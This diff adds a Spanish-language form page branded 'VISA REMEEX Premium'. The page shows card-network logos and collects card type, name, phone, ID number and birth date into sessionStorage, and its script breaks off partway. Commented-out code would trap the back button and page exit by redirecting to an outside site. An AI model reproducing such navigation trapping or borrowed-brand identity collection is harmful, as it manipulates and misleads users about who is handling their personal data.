@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>VISA REMEEX Premium - Página 2</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Página 2 de VISA REMEEX Premium. Tipo y Marca de Tarjeta, Beneficiario Receptor." />
+
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
+
+  <!-- Fuentes e Iconos -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+
+  <!-- Estilos CSS -->
+  <style>
+    :root {
+      --primary: #1a1f71;
+      --primary-dark: #0d153e;
+      --secondary: #3b82f6;
+      --accent: #60a5fa;
+      --success: #22c55e;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --border-white: #ffffff;
+      --border-gray: #d1d5db;
+      --border-light-blue: #93c5fd;
+      --background: #f8fafc;
+      --card-bg: rgba(255, 255, 255, 0.98);
+      --text-primary: #0f172a;
+      --text-secondary: #475569;
+      --border-radius-xl: 28px;
+      --border-radius-lg: 24px;
+      --border-radius: 16px;
+      --border-radius-sm: 12px;
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
+      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
+      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
+      --aurora-gradient: linear-gradient(120deg, rgba(26, 31, 113, 0.4), rgba(25, 35, 102, 0.3), rgba(30, 40, 120, 0.3), rgba(26, 31, 113, 0.2));
+      background-size: 400% 400%;
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+      font-family: 'Inter', sans-serif;
+      color: var(--text-primary);
+      line-height: 1.6;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 1rem;
+      overflow-x: hidden;
+    }
+    .container {
+      max-width: 650px;
+      width: 100%;
+      margin-top: 2rem;
+      background: var(--card-bg);
+      border-radius: var(--border-radius-xl);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+      border: 2px solid var(--border-white);
+      overflow: hidden;
+      position: relative;
+      transition: var(--transition);
+      animation: glow 6s ease infinite, border-blink 6s linear infinite;
+    }
+    @keyframes glow {
+      0%, 100% {
+        box-shadow: 0 0 30px rgba(26, 31, 113, 0.4), 0 0 60px rgba(26, 31, 113, 0.2);
+      }
+      50% {
+        box-shadow: 0 0 50px rgba(26, 31, 113, 0.6), 0 0 80px rgba(26, 31, 113, 0.4);
+      }
+    }
+    @keyframes border-blink {
+      0% { border-color: var(--border-white); }
+      33% { border-color: var(--border-gray); }
+      66% { border-color: var(--border-light-blue); }
+      100% { border-color: var(--border-white); }
+    }
+    .container:hover {
+      transform: translateY(-5px);
+      box-shadow: var(--shadow-lg);
+    }
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+      color: #fff;
+      padding: 3rem 2rem;
+      position: relative;
+      overflow: hidden;
+      border-top-left-radius: var(--border-radius-xl);
+      border-top-right-radius: var(--border-radius-xl);
+      background-image: var(--aurora-gradient);
+      animation: aurora-animation 15s ease infinite;
+    }
+    @keyframes aurora-animation {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    /* Destello de luz en la cabecera */
+    .header::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.6), transparent);
+      transform: skewX(-20deg);
+      opacity: 0;
+      z-index: 1;
+      animation: header-flash 3s infinite;
+    }
+    @keyframes header-flash {
+      0% {
+        left: -100%;
+        opacity: 0;
+      }
+      10% {
+        left: -50%;
+        opacity: 1;
+      }
+      50% {
+        left: 100%;
+        opacity: 1;
+      }
+      60% {
+        left: 100%;
+        opacity: 0;
+      }
+      100% {
+        left: 100%;
+        opacity: 0;
+      }
+    }
+    .header-logo {
+      display: block;
+      margin: 0 auto 1rem auto;
+      width: 80%;
+      max-width: 400px;
+      height: auto;
+      position: relative;
+      z-index: 2;
+    }
+    .header p {
+      font-size: 1.2rem;
+      line-height: 1.6;
+      max-width: 600px;
+      margin: 0 auto;
+      opacity: 0.95;
+      position: relative;
+      z-index: 2;
+    }
+    .logo-bar {
+      background: var(--card-bg);
+      backdrop-filter: blur(10px);
+      padding: 1rem 0.5rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 2rem;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      margin-bottom: 1rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .logo-bar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(120deg, rgba(255,255,255,0.1), rgba(255,255,255,0.2), rgba(255,255,255,0.1));
+      animation: shimmer 3s linear infinite;
+    }
+    @keyframes shimmer {
+      0% { transform: translateX(-50%); }
+      100% { transform: translateX(50%); }
+    }
+    .logo-bar img {
+      height: 36px;
+      filter: grayscale(20%);
+      opacity: 0.9;
+      transition: var(--transition);
+      position: relative;
+      z-index: 2;
+    }
+    .logo-bar img:hover {
+      filter: none;
+      opacity: 1;
+      transform: scale(1.08);
+    }
+    .progress-bar {
+      height: 16px;
+      background-color: #e2e8f0;
+      border-radius: var(--border-radius);
+      margin: 2rem;
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      width: 0%;
+      transition: width 0.6s ease-in-out;
+      border-radius: var(--border-radius);
+      position: relative;
+      overflow: hidden;
+    }
+    .progress-bar-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: skewX(-45deg);
+      animation: move 2s linear infinite;
+    }
+    @keyframes move {
+      0% { left: -50%; }
+      100% { left: 100%; }
+    }
+    .section-content {
+      padding: 2rem;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: all 0.4s ease-out;
+      display: none;
+    }
+    .section-content.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .section-content h2 {
+      margin-bottom: 1.5rem;
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      color: var(--primary);
+    }
+    .section-content h2 i {
+      color: var(--primary);
+      font-size: 1.3rem;
+    }
+    .form-group {
+      margin-bottom: 1.75rem;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.875rem 1.25rem;
+      border: 2px solid #e2e8f0;
+      border-radius: var(--border-radius);
+      font-size: 1rem;
+      background: #fff;
+      transition: var(--transition);
+      color: var(--text-primary);
+    }
+    .form-control:hover {
+      border-color: #cbd5e1;
+    }
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
+    }
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-top: 1.5rem;
+      padding: 1rem;
+      background: #f8fafc;
+      border-radius: var(--border-radius);
+      border: 1px solid #e2e8f0;
+    }
+    .checkbox-group input[type="checkbox"] {
+      width: 1.2rem;
+      height: 1.2rem;
+      border-radius: 4px;
+      border: 2px solid var(--primary);
+      transition: var(--transition);
+      cursor: pointer;
+    }
+    .checkbox-group input[type="checkbox"]:checked {
+      background: var(--primary);
+    }
+    .checkbox-group a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 500;
+      transition: var(--transition);
+    }
+    .checkbox-group a:hover {
+      color: var(--primary-dark);
+      text-decoration: underline;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      font-size: 0.95rem;
+      transition: var(--transition);
+      border: none;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      box-shadow: var(--shadow-sm);
+      position: relative;
+      z-index: 1;
+    }
+    .btn-primary::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
+      background-size: 200% 100%;
+      border-radius: var(--border-radius-sm);
+      animation: border-glow 3s ease infinite;
+      filter: blur(8px);
+      opacity: 0.7;
+      z-index: -1;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--shadow);
+    }
+    .btn-outline {
+      background: transparent;
+      color: var(--primary);
+      border: 2px solid var(--primary);
+      position: relative;
+      z-index: 1;
+    }
+    .btn-outline::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
+      background-size: 200% 100%;
+      border-radius: var(--border-radius-sm);
+      animation: border-glow 3s ease infinite;
+      filter: blur(8px);
+      opacity: 0.7;
+      z-index: -1;
+    }
+    .btn-outline:hover {
+      background: rgba(20, 52, 203, 0.05);
+    }
+    @keyframes border-glow {
+      0% { background-position: -100% 0; }
+      50% { background-position: 100% 0; }
+      100% { background-position: -100% 0; }
+    }
+    .modal-overlay {
+      backdrop-filter: blur(8px);
+      background: rgba(0,0,0,0.2);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .modal-content {
+      transform: translateY(20px);
+      opacity: 0;
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      background: rgba(255, 255, 255, 0.95);
+      border: 2px solid var(--border-white);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1), 0 1px 8px rgba(0,0,0,0.2);
+      max-width: 550px;
+      padding: 2.5rem;
+      border-radius: var(--border-radius-lg);
+      backdrop-filter: blur(10px);
+      position: relative;
+    }
+    .modal-overlay.active .modal-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .summary-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1.5rem;
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+    .spinner-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .bank-logo {
+      width: 120px;
+      height: auto;
+      border-radius: 8px;
+      transition: transform 0.3s ease;
+    }
+    .bank-logo:hover {
+      transform: scale(1.05);
+    }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      display: flex;
+      justify-content: space-between;
+    }
+    .spinner-bar {
+      width: 6px;
+      height: 100%;
+      background: var(--primary);
+      border-radius: 3px;
+      animation: spinner-animation 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    }
+    .spinner-bar:nth-child(1) { animation-delay: -0.24s; }
+    .spinner-bar:nth-child(2) { animation-delay: -0.12s; }
+    .spinner-bar:nth-child(3) { animation-delay: 0s; }
+    @keyframes spinner-animation {
+      0% { transform: scaleY(0.4); opacity: 0.7; }
+      20% { transform: scaleY(1); opacity: 1; }
+      40%, 100% { transform: scaleY(0.4); opacity: 0.7; }
+    }
+    .modal-content h3 {
+      color: var(--primary);
+      font-size: 1.5rem;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 2rem;
+      padding-bottom: 1rem;
+      border-bottom: 2px solid rgba(26, 31, 113, 0.1);
+    }
+    .modal-content p {
+      background: rgba(26, 31, 113, 0.03);
+      padding: 1.5rem;
+      border-radius: var(--border-radius);
+      margin-bottom: 1.5rem;
+      line-height: 1.8;
+      color: var(--text-primary);
+    }
+    .modal-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 1.5rem;
+      margin-top: 2rem;
+      flex-wrap: wrap;
+    }
+    .modal-buttons .btn-glow {
+      width: 120px;
+      height: 45px;
+      font-size: 0.9rem;
+    }
+    .countdown {
+      text-align: center;
+      display: block;
+      margin-top: 1.5rem;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+    @media (max-width: 768px) {
+      .header { padding: 1.5rem 1rem; }
+      .header p { font-size: 1rem; }
+      .logo-bar { gap: 2rem; padding: 1rem; }
+      .logo-bar img { height: 28px; }
+      .container { margin: 1rem auto; padding: 1rem; }
+      .section-content { padding: 1.5rem; }
+      .btn { padding: 0.6rem 1.2rem; }
+    }
+    @media (max-width: 480px) {
+      .header p { font-size: 0.95rem; }
+      .logo-bar { gap: 1.5rem; }
+      .logo-bar img { height: 24px; }
+      .container { padding: 0.5rem; }
+      .btn { padding: 0.5rem 1rem; font-size: 0.9rem; }
+      .summary-header { flex-direction: column; align-items: center; gap: 1rem; }
+      .bank-logo { width: 60px; }
+    }
+
+    /* Botón moderno con efecto glow (estilo de index.html) */
+    .btn-container {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 1.5rem;
+      position: relative;
+      width: 250px;
+      height: 60px;
+    }
+    .btn-glow-effect {
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(
+        90deg, 
+        transparent, 
+        var(--primary), 
+        var(--secondary), 
+        transparent
+      );
+      background-size: 200% 100%;
+      border-radius: 30px;
+      animation: border-glow 3s ease infinite;
+      filter: blur(10px);
+      opacity: 0.7;
+      z-index: 0;
+    }
+    .btn-glow {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      overflow: hidden;
+      box-shadow: 0 15px 25px rgba(0,0,0,0.3), inset 0 -4px 8px rgba(255,255,255,0.3);
+      transition: all 0.3s ease;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 1rem;
+    }
+    .btn-glow-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+    .btn-glow-initial {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    .btn-glow:hover .btn-glow-initial {
+      opacity: 0;
+      transform: translateX(100%);
+    }
+    .btn-glow-hover {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transform: translateX(-100%);
+      color: white;
+    }
+    .btn-glow:hover .btn-glow-hover {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    .btn-glow-icon {
+      margin-left: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <!-- Se utiliza el enlace solicitado para el logo REMEEX VISA -->
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX VISA Logo" class="header-logo">
+    <p>Envía dinero al instante sin comisiones</p>
+  </div>
+
+  <div class="logo-bar">
+    <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
+    <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
+    <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
+  </div>
+
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="progressBarFill"></div>
+  </div>
+
+  <div class="section-content active" id="step1">
+    <h2><i class="fas fa-credit-card"></i> Tipo de Tarjeta</h2>
+    <div class="form-group">
+      <label class="form-label" for="cardMethod">Seleccione el tipo de Tarjeta</label>
+      <select class="form-control" id="cardMethod">
+        <option value="">-- Selecciona --</option>
+        <option value="Crédito Internacional">Tarjeta de crédito internacional</option>
+        <option value="Débito Internacional">Tarjeta de débito internacional</option>
+      </select>
+    </div>
+    <div class="form-group" id="brandContainer" style="display:none;">
+      <label class="form-label" for="cardBrand">Marca de Tarjeta</label>
+      <select class="form-control" id="cardBrand">
+        <option value="">-- Selecciona --</option>
+        <option value="VISA">VISA</option>
+        <option value="MasterCard">MasterCard</option>
+        <option value="AmericanExpress">AmericanExpress</option>
+      </select>
+    </div>
+    <div class="btn-container">
+      <div class="btn-glow-effect"></div>
+      <button class="btn-glow" id="continueBtnStep1">
+        <div class="btn-glow-content btn-glow-initial">
+          Continuar
+        </div>
+        <div class="btn-glow-content btn-glow-hover">
+          Continuar
+          <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="5" y1="12" x2="19" y2="12"></line>
+            <polyline points="12 5 19 12 12 19"></polyline>
+          </svg>
+        </div>
+      </button>
+    </div>
+  </div>
+
+  <div class="section-content" id="step2">
+    <h2><i class="fas fa-user"></i> Beneficiario Receptor</h2>
+    <p style="margin-bottom:1rem; font-size:0.9rem; color:var(--text-secondary);">
+      Completa tus datos para validar tu identidad.
+      Asegúrate de que coincidan con tu documento oficial.
+    </p>
+    <div class="form-group">
+      <label class="form-label" for="fullName">Nombres y Apellidos</label>
+      <input type="text" class="form-control" id="fullName" placeholder="Ej.: Juan Pérez" />
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="phonePrefix">Teléfono</label>
+      <div style="display:flex; gap:0.5rem;">
+        <select class="form-control" id="phonePrefix" style="max-width:150px;">
+          <option value="">-- Prefijo --</option>
+          <option value="0414">0414</option>
+          <option value="0424">0424</option>
+          <option value="0412">0412</option>
+          <option value="0416">0416</option>
+          <option value="0426">0426</option>
+        </select>
+        <input type="text" class="form-control" id="phoneNumber" placeholder="7 dígitos" maxlength="7" />
+      </div>
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="docType">Tipo de Documento</label>
+      <select class="form-control" id="docType">
+        <option value="">-- Selecciona --</option>
+        <option value="Cédula de Identidad">Cédula de Identidad</option>
+        <option value="Pasaporte Vigente">Pasaporte Vigente</option>
+        <option value="Licencia de Conducir">Licencia de Conducir</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="nationality">Nacionalidad</label>
+      <select class="form-control" id="nationality">
+        <option value="">-- Selecciona --</option>
+        <option value="Nacional">Nacional</option>
+        <option value="Extranjero">Extranjero</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="docNumber">Número de documento</label>
+      <input type="text" class="form-control" id="docNumber" placeholder="8 a 10 dígitos" maxlength="10" />
+    </div>
+    <div class="form-group">
+      <label class="form-label" for="birthDate">Fecha de nacimiento</label>
+      <input type="date" class="form-control" id="birthDate" max="9999-12-31" />
+    </div>
+    <div class="form-group checkbox-group">
+      <input type="checkbox" id="isAdult" />
+      <label for="isAdult">Declaro que soy mayor de edad</label>
+    </div>
+    <div class="btn-container">
+      <div class="btn-glow-effect"></div>
+      <button class="btn-glow" id="continueBtnStep2">
+        <div class="btn-glow-content btn-glow-initial">
+          Continuar
+        </div>
+        <div class="btn-glow-content btn-glow-hover">
+          Continuar
+          <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="5" y1="12" x2="19" y2="12"></line>
+            <polyline points="12 5 19 12 12 19"></polyline>
+          </svg>
+        </div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-content">
+    <div class="summary-header">
+      <div class="spinner-container">
+        <div class="spinner">
+          <div class="spinner-bar"></div>
+          <div class="spinner-bar"></div>
+          <div class="spinner-bar"></div>
+        </div>
+      </div>
+      <img src="" alt="Bank Logo" id="bankLogo" class="bank-logo" style="display:none;">
+    </div>
+    <h3>Resumen de datos</h3>
+    <p id="summaryText"></p>
+    <div class="modal-buttons">
+      <button class="btn btn-outline" id="editBtn">Editar</button>
+      <button class="btn btn-primary" id="acceptBtn" disabled>Aceptar</button>
+    </div>
+    <span class="countdown" id="countdownMsg">Disponible en 10s</span>
+  </div>
+</div>
+
+<script>
+  let isRedirecting = false;
+
+  // Redirecciones globales comentadas:
+  // history.pushState({}, '', '');
+  // window.addEventListener('popstate', function(event) {
+  //   window.location.href = "https://remeexvisa.com";
+  // });
+
+  // window.addEventListener('beforeunload', function(e) {
+  //   if (!isRedirecting) {
+  //     e.preventDefault();
+  //     window.location.href = "https://remeexvisa.com";
+  //     e.returnValue = '';
+  //   }
+  // });
+
+  const cardMethodSelect = document.getElementById("cardMethod");
+  const brandContainer = document.getElementById("brandContainer");
+  const cardBrandSelect = document.getElementById("cardBrand");
+  const continueBtnStep1 = document.getElementById("continueBtnStep1");
+
+  const fullNameInput = document.getElementById("fullName");
+  const phonePrefixSelect = document.getElementById("phonePrefix");
+  const phoneNumberInput = document.getElementById("phoneNumber");
+  const docTypeSelect = document.getElementById("docType");
+  const nationalitySelect = document.getElementById("nationality");
+  const docNumberInput = document.getElementById("docNumber");
+  const birthDateInput = document.getElementById("birthDate");
+  const isAdultCheckbox = document.getElementById("isAdult");
+  const continueBtnStep2 = document.getElementById("continueBtnStep2");
+
+  const progressBarFill = document.getElementById("progressBarFill");
+
+  const modalOverlay = document.getElementById("modalOverlay");
+  const summaryText = document.getElementById("summaryText");
+  const editBtn = document.getElementById("editBtn");
+  const acceptBtn = document.getElementById("acceptBtn");
+  const countdownMsg = document.getElementById("countdownMsg");
+  const bankLogo = document.getElementById("bankLogo");
+
+  let selectedOptions = {
+    cardType: false,
+    cardBrand: false,
+    beneficiaryData: false,
+  };
+  let currentStep = 1;
+  let countdownInterval;
+  let secondsLeft = 10;
+
+  const bankLogos = {
+    "VISA": "https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png",
+    "MasterCard": "https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg",
+    "AmericanExpress": "https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg"
+  };
+
+  function updateProgressBar() {
+    let completedSteps = 0;
+    for (const option in selectedOptions) {
+      if (selectedOptions[option]) {
+        completedSteps++;
+      }
+    }
+    const progressPercentage = (completedSteps / 3) * 100;
+    progressBarFill.style.width = `${progressPercentage}%`;
+  }
+
+  function showNextSection() {
+    const sections = document.querySelectorAll(".section-content");
+    sections.forEach((section, index) => {
+      if (index === currentStep - 1) {
+        section.classList.add("active");
+      } else {
+        section.classList.remove("active");
+      }
+    });
+  }
+
+  function validateStep1() {
+    if (!selectedOptions.cardType) {
+      alert("Por favor, selecciona el tipo de tarjeta.");
+      return false;
+    }
+    if (!selectedOptions.cardBrand) {
+      alert("Por favor, selecciona la marca de la tarjeta.");
+      return false;
+    }
+    return true;
+  }
+
+  function validateStep2() {
+    const fullName = fullNameInput.value.trim();
+    const phonePrefix = phonePrefixSelect.value;
+    const phoneNumber = phoneNumberInput.value.trim();
+    const docType = docTypeSelect.value;
+    const nationality = nationalitySelect.value;
+    const docNumber = docNumberInput.value.trim();
+    const birthDate = birthDateInput.value;
+    const isAdult = isAdultCheckbox.checked;
+
+    const nameRegex = /^[a-zA-ZÀ-ÿ]+(\s[a-zA-ZÀ-ÿ]+)+$/;
+    if (!fullName || !nameRegex.test(fullName)) {
+      alert("Ingrese Nombres y Apellidos válidos (solo letras y al menos un espacio).");
+      return false;
+    }
+    if (!phonePrefix) {
+      alert("Seleccione el prefijo del teléfono.");
+      return false;
+    }
+    if (!/^\d{7}$/.test(phoneNumber)) {
+      alert("El número de teléfono debe tener exactamente 7 dígitos.");
+      return false;
+    }
+    if (!docType) {
+      alert("Seleccione el tipo de documento.");
+      return false;
+    }
+    if (!nationality) {
+      alert("Seleccione la nacionalidad.");
+      return false;
+    }
+    if (!/^\d{8,10}$/.test(docNumber)) {
+      alert("El número de documento debe contener entre 8 y 10 dígitos.");
+      return false;
+    }
+    if (!birthDate) {
+      alert("Seleccione la fecha de nacimiento.");
+      return false;
+    }
+    if (!isAdult) {
+      alert("Debe confirmar que es mayor de edad.");
+      return false;
+    }
+    selectedOptions.beneficiaryData = true;
+    updateProgressBar();
+    return true;
+  }
+
+  function showSummary() {
+    const fullName = fullNameInput.value.trim();
+    const phonePrefix = phonePrefixSelect.value;
+    const phoneNumber = phoneNumberInput.value.trim();
+    const docType = docTypeSelect.value;
+    const nationality = nationalitySelect.value;
+    const docNumber = docNumberInput.value.trim();
+    const birthDate = birthDateInput.value;
+
+    let docPrefix = "";
+    if (docType === "Cédula de Identidad") docPrefix = "V-";
+    else if (docType === "Pasaporte Vigente") docPrefix = "P-";
+    else if (docType === "Licencia de Conducir") docPrefix = "L-";
+
+    let resumen = `
+      <strong>Nombres y Apellidos:</strong> ${fullName}<br/>
+      <strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}<br/>
+      <strong>Tipo de Documento:</strong> ${docType}<br/>
+      <strong>Nacionalidad:</strong> ${nationality}<br/>
+      <strong>Número de Documento:</strong> ${docPrefix}${docNumber}<br/>
+      <strong>Fecha de Nacimiento:</strong> ${birthDate}<br/>
+    `;
+    summaryText.innerHTML = resumen;
+
+    const selectedBrand = cardBrandSelect.value;
+    const logoUrl = bankLogos[selectedBrand];
+    if (logoUrl) {
+      bankLogo.src = logoUrl;
+      bankLogo.style.display = "block";
+    } else {
+      bankLogo.style.display = "none";
+    }
+    openModal();
+  }
+
+  function openModal() {
+    modalOverlay.classList.add("active");
+    acceptBtn.disabled = true;
+    secondsLeft = 10;
+    countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+    countdownInterval = setInterval(() => {
+      secondsLeft--;
+      countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+      if (secondsLeft <= 0) {
+        clearInterval(countdownInterval);
+        acceptBtn.disabled = false;
+        countdownMsg.textContent = "¡Listo para continuar!";
+      }
+    }, 1000);
+  }
+
+  function closeModal() {
+    modalOverlay.classList.remove("active");
+    clearInterval(countdownInterval);
+  }
+
+  cardMethodSelect.addEventListener("change", () => {
+    selectedOptions.cardType = !!cardMethodSelect.value;
+    brandContainer.style.display = cardMethodSelect.value ? "block" : "none";
+    updateProgressBar();
+  });
+  cardBrandSelect.addEventListener("change", () => {
+    selectedOptions.cardBrand = !!cardBrandSelect.value;
+    updateProgressBar();
+  });
+  continueBtnStep1.addEventListener("click", () => {
+    if (validateStep1()) {
+      currentStep = 2;
+      showNextSection();
+    }
+  });
+  continueBtnStep2.addEventListener("click", () => {
+    if (validateStep2()) {
+      showSummary();
+    }
+  });
+  editBtn.addEventListener("click", () => {
+    closeModal();
+  });
+  acceptBtn.addEventListener("click", () => {
+    if (validateStep2()) {
+      continueRemeex();
+    }
+  });
+
+  document.addEventListener("DOMContentLoaded", function() {
+    const savedData = JSON.parse(sessionStorage.getItem('beneficiaryData')) || {};
+
+    if (savedData.cardType) {
+      cardMethodSelect.value = savedData.cardType;
+      selectedOptions.cardType = true;
+      brandContainer.style.display = savedData.cardType ? "block" : "none";
+    }
+    if (savedData.cardBrand) {
+      cardBrandSelect.value = savedData.cardBrand;
+      selectedOptions.cardBrand = true;
+    }
+    if (savedData.fullName) {
+      fullNameInput.value = savedData.fullName;
+    }
+    if (savedData.telefono) {
+      const [prefix, number] = savedData.telefono.split("-");
+      phonePrefixSelect.value = prefix;
+      phoneNumberInput.value = number;
+    }
+    if (savedData.docType) {
+      docTypeSelect.value = savedData.docType;
+    }
+    if (savedData.nationality) {
+      nationalitySelect.value = savedData.nationality;
+    }
+    if (savedData.docNumber) {
+      docNumberInput.value = savedData.docNumber;
+    }
+    if (savedData.birthDate) {
+      birthDateInput.value = savedData.birthDate;
+    }
+    if (savedData.isAdult) {
+      isAdultCheckbox.checked = savedData.isAdult;
+      selectedOptions.beneficiaryData = true;
+    }
+    updateProgressBar();
+
+    cardMethodSelect.addEventListener("change", guardarDatosAutomaticamente);
+    cardBrandSelect.addEventListener("change", guardarDatosAutomaticamente);
+    fullNameInput.addEventListener("input", guardarDatosAutomaticamente);
+    phonePrefixSelect.addEventListener("change", guardarDatosAutomaticamente);
+    phoneNumberInput.addEventListener("input", guardarDatosAutomaticamente);
+    docTypeSelect.addEventListener("change", guardarDatosAutomaticamente);
